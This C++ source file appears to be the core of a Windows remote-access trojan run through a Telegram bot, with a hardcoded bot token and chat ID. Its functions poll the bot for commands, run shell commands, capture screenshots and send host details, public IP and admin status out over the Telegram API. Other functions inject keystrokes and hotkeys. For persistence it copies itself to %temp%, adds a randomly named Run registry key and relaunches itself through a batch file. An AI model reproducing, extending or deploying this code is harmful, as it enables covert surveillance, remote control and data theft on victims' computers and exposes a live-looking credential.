#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <vector>
#include <atlimage.h>
#include <winternl.h>
#include <winsock.h>
#include <iomanip>
#include <nlohmann/json.hpp>
#include <cpr/cpr.h>
#pragma comment(lib, "Shlwapi.lib")

using namespace std;
using json = nlohmann::json;

string ID;
const string botApi = "1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664"; //https://api.telegram.org/bot1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664/getUpdates
const string chat_id = "-1001487776950";

inline bool filexits(const string& name) {
    struct stat buffer;
    return (stat(name.c_str(), &buffer) == 0);
}

json GetLastMessage()
{
    auto response = cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + botApi + "/getUpdates?last=1&offset=-1" });
    string s = response.text;
    s = s.substr(21, s.size() - 23);
    if (s.empty()) {
        json jd;
        jd["message_id"] = 69;
        jd["date"] = -1;
        return jd;
    }
    json j = json::parse(s);
    j = j["channel_post"];
    return j;
}

bool ChangeVolume(double nVolume, bool bScalar)
{

    HRESULT hr = 0;
    bool decibels = false;
    bool scalar = false;
    double newVolume = nVolume;

    auto j = CoInitialize(NULL);
    IMMDeviceEnumerator* deviceEnumerator = NULL;
    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER,
        __uuidof(IMMDeviceEnumerator), (LPVOID*)&deviceEnumerator);
    IMMDevice* defaultDevice = NULL;

    hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
    deviceEnumerator->Release();
    deviceEnumerator = NULL;

    IAudioEndpointVolume* endpointVolume = NULL;
    hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume),
        CLSCTX_INPROC_SERVER, NULL, (LPVOID*)&endpointVolume);
    defaultDevice->Release();
    defaultDevice = NULL;

    float currentVolume = 0;
    endpointVolume->GetMasterVolumeLevel(&currentVolume);

    hr = endpointVolume->GetMasterVolumeLevelScalar(&currentVolume);

    if (bScalar == false)
    {
        hr = endpointVolume->SetMasterVolumeLevel((float)newVolume, NULL);
    }
    else if (bScalar == true)
    {
        hr = endpointVolume->SetMasterVolumeLevelScalar((float)newVolume, NULL);
    }
    endpointVolume->Release();

    CoUninitialize();

    return FALSE;
}

void setID(string newID)
{
    ID = newID;
    fstream file;
    file.open("ID.id", ios::out);
    file << newID;
    file.close();
}

inline void press(char a, bool bigone = 0)
{
    if (bigone) {
        keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
        Sleep(5);
        keybd_event(VkKeyScan(a), 1, 0, 0);
        Sleep(5);
        keybd_event(VkKeyScan(a), 1, KEYEVENTF_KEYUP, 0);
        keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
    }
    else {
        keybd_event(VkKeyScan(a), 1, 0, 0);
        Sleep(5);
        keybd_event(VkKeyScan(a), 1, KEYEVENTF_KEYUP, 0);
    }
}


void TakeScreenShot(const std::string& path)
{
    //setting to the screen shot
    keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
    keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
    Sleep(5);
    keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
    keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);

    //handler of the bitmap that save the screen shot
    HBITMAP hBitmap;

    //I have to give for it time to make it work
    Sleep(500);

    //take the screen shot
    OpenClipboard(NULL);

    //save the screen shot in the bitmap handler 
    hBitmap = (HBITMAP)GetClipboardData(CF_BITMAP);
    CloseClipboard();

    std::vector<BYTE> buf;
    IStream* stream = NULL;
    HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
    CImage image;
    ULARGE_INTEGER liSize;

    // screenshot to jpg and save to stream
    image.Attach(hBitmap);
    image.Save(stream, Gdiplus::ImageFormatJPEG);
    IStream_Size(stream, &liSize);
    DWORD len = liSize.LowPart;
    IStream_Reset(stream);
    buf.resize(len);
    IStream_Read(stream, &buf[0], len);
    stream->Release();

    // put the imapge in the file
    std::fstream fi;
    fi.open(path, std::fstream::binary | std::fstream::out);
    fi.write(reinterpret_cast<const char*>(&buf[0]), buf.size() * sizeof(BYTE));
    fi.close();
}

string get_exe() {
    //https://stackoverflow.com/questions/10814934/how-can-program-get-executable-name-of-itself
    TCHAR buffer[MAX_PATH] = { 0 };
    TCHAR* out;
    DWORD bufSize = sizeof(buffer) / sizeof(*buffer);
    GetModuleFileName(NULL, buffer, bufSize);
    out = PathFindFileName(buffer);
    return out;
}

string get_path() {
    //https://stackoverflow.com/questions/10814934/how-can-program-get-executable-name-of-itself
    TCHAR buffer[MAX_PATH] = { 0 };
    DWORD bufSize = sizeof(buffer) / sizeof(*buffer);
    GetModuleFileName(NULL, buffer, bufSize);
    
    return buffer;
}

//https://stackoverflow.com/questions/154536/encode-decode-urls-in-c
string url_encode(const string& value) {
    ostringstream escaped;
    escaped.fill('0');
    escaped << hex;

    for (string::const_iterator i = value.begin(), n = value.end(); i != n; ++i) {
        string::value_type c = (*i);

        // Keep alphanumeric and other accepted characters intact
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
            continue;
        }

        // Any other characters are percent-encoded
        escaped << uppercase;
        escaped << '%' << setw(2) << int((unsigned char)c);
        escaped << nouppercase;
    }

    return escaped.str();
}

void Send(string to_send) {
    cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + botApi + "/sendMessage?chat_id=" + chat_id + "&text=" + url_encode(to_send)});
}

string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

BOOL IsProcessElevated()
{
    BOOL fIsElevated = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        printf("\n Failed to get Process Token :%d.", GetLastError());
        goto Cleanup;  // if Failed, we treat as False
    }


    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
    {
        printf("\nFailed to get Token Information :%d.", GetLastError());
        goto Cleanup;// if Failed, we treat as False
    }

    fIsElevated = elevation.TokenIsElevated;

Cleanup:
    if (hToken)
    {
        CloseHandle(hToken);
        hToken = NULL;
    }
    return fIsElevated;
}

string getStatus() {
    string status;

    int uptime_h = ((double)clock())/CLOCKS_PER_SEC/3600;
    int uptime_m = ((double)clock()) /CLOCKS_PER_SEC/60;
    uptime_m -= uptime_h * 60;
    if (uptime_m < 0)uptime_m = 0;
    status = "uptime: " + to_string(uptime_h) + "h" + to_string(uptime_m) + "m" + '\n';
    status += "exe_name: " + get_exe() + '\n';
    string buffer = exec("hostname");
    buffer[buffer.size() - 1] = ' ';
    status += "host_name: " + buffer + '\n';
    auto response = cpr::Get(cpr::Url{ "https://myexternalip.com/raw" });
    status += "public_ip: " + response.text + '\n';
    status += "admin_rights: " + to_string(IsProcessElevated()) + '\n';
    status += "exe_path: " + get_path();
    return status;
}

string random_string(int lenght) {
    string random = "";
    while (lenght--) {
        char ran = rand() % 25 + 97;
        random += ran;
    }
    return random;
}

void autostart() {
    string path;
    char username[256 + 1];
    DWORD username_len = 256 + 1;
    GetUserName(username, &username_len);

    char letter[256 + 1];
    GetSystemDirectory(letter, sizeof(letter));

    path = letter[0];
    path += ":\\Users\\" + (string)username + "\\AppData\\Local\\Temp";
    if (!filexits(path + "\\" + get_exe())) {
        fstream file;
        file.open("o.bat", ios::out);
        file << "TASKKILL /F /IM " << get_exe() << endl
            << "move " << get_exe() << " %temp%" << endl
            << "move " << "shitoo" << " %temp%" << endl
            << "start %temp%\\" + get_exe();
        file.close();
        string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + random_string(16) + " /t REG_SZ /d %temp%\\" + get_exe();
        system(cmd.c_str());

        char buffer[MAX_PATH];
        ::GetModuleFileNameA(NULL, buffer, MAX_PATH);
        string buff2(buffer);
        buff2.erase(buff2.size() - get_exe().size(), 256);
        file.open("shitoo", ios::out);
        file << buff2 + "o.bat";
        file.close();
        system("o.bat");
    }
    if (filexits(path + "\\shitoo")) {
        fstream file;
        string path2;
        file.open(path + "\\shitoo", ios::in);
        file >> path2;
        file.close();
        remove(path2.c_str());
        remove("shitoo");
    }
}

void hotkeys(string hotkey) {
    string buff;
    //pressing keys
    for (int i = 0; i < hotkey.size(); i++) {
        if (hotkey[i] == '+') {
            //it looks like a shit but idk other way
            if (buff.size() == 1 && buff[0] >= 97 && buff[0] <= 122) keybd_event(VkKeyScan(buff[0]), 1, 0, 0);
            else if (buff == "esc") { keybd_event(VK_ESCAPE, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "tab") { keybd_event(VK_TAB, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "capslock") { keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "shift") { keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "ctrl") { keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "win") { keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "alt") { keybd_event(VK_MENU, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "ralt") { keybd_event(VK_RMENU, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "space") { keybd_event(VK_SPACE, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "enter") { keybd_event(VK_RETURN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "backspace") { keybd_event(VK_BACK, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "del") { keybd_event(VK_DELETE, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f1") { keybd_event(VK_F1, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f2") { keybd_event(VK_F2, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f3") { keybd_event(VK_F3, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f4") { keybd_event(VK_F4, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f5") { keybd_event(VK_F5, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f6") { keybd_event(VK_F6, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f7") { keybd_event(VK_F7, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f8") { keybd_event(VK_F8, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f9") { keybd_event(VK_F9, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f10") { keybd_event(VK_F10, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f11") { keybd_event(VK_F11, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "f12") { keybd_event(VK_F12, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "ins") { keybd_event(VK_INSERT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "home") { keybd_event(VK_HOME, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "end") { keybd_event(VK_END, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "pgdn") { keybd_event(VK_NEXT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "pgup") { keybd_event(VK_PRIOR, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "uparrow") { keybd_event(VK_UP, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "downarrow") { keybd_event(VK_DOWN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "leftarrow") { keybd_event(VK_LEFT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "rightarrow") { keybd_event(VK_RIGHT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
            else if (buff == "lmouse") { keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }

            buff.clear();
        }
        else buff += hotkey[i];
    }
    //unpressing keys
    buff.clear();
    for (int i = 0; i < hotkey.size(); i++) {
        if (hotkey[i] == '+') {
            //it looks like a shit but idk other way
            if (buff.size() == 1 && buff[0] >= 97 && buff[0] <= 122) keybd_event(VkKeyScan(buff[0]), 1, KEYEVENTF_KEYUP, 0);
            else if (buff == "esc") { keybd_event(VK_ESCAPE, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "tab") { keybd_event(VK_TAB, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "capslock") { keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "shift") { keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "ctrl") { keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "win") { keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "alt") { keybd_event(VK_MENU, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "ralt") { keybd_event(VK_RMENU, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "space") { keybd_event(VK_SPACE, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "enter") { keybd_event(VK_RETURN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "backspace") { keybd_event(VK_BACK, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "del") { keybd_event(VK_DELETE, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f1") { keybd_event(VK_F1, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f2") { keybd_event(VK_F2, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f3") { keybd_event(VK_F3, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f4") { keybd_event(VK_F4, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f5") { keybd_event(VK_F5, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f6") { keybd_event(VK_F6, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f7") { keybd_event(VK_F7, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f8") { keybd_event(VK_F8, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f9") { keybd_event(VK_F9, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f10") { keybd_event(VK_F10, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f11") { keybd_event(VK_F11, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "f12") { keybd_event(VK_F12, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "ins") { keybd_event(VK_INSERT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "home") { keybd_event(VK_HOME, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "end") { keybd_event(VK_END, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "pgdn") { keybd_event(VK_NEXT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "pgup") { keybd_event(VK_PRIOR, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "uparrow") { keybd_event(VK_UP, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "downarrow") { keybd_event(VK_DOWN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "leftarrow") { keybd_event(VK_LEFT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "rightarrow") { keybd_event(VK_RIGHT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
            else if (buff == "leftbutton") { keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }

            buff.clear();
        }
        else buff += hotkey[i];
    }
}

void logo() {
    cout << "     _                   _      _____  ___   ___   ___" << endl
        << "  __| |_   _ _ __  _ __ (_)_  _|___ / / _ \\ / _ \\ / _ \\" << endl
        << " / _` | | | | '_ \\| '_ \\| \\ \\/ / |_ \\| | | | | | | | | |" << endl
        << "| (_| | |_| | |_) | | | | |>  < ___) | |_| | |_| | |_| |" << endl
        << " \\__,_|\\__,_| .__/|_| |_|_/_/\\_\\____/ \\___/ \\___/ \\___/" << endl
        << "            |_|" << endl;
}      
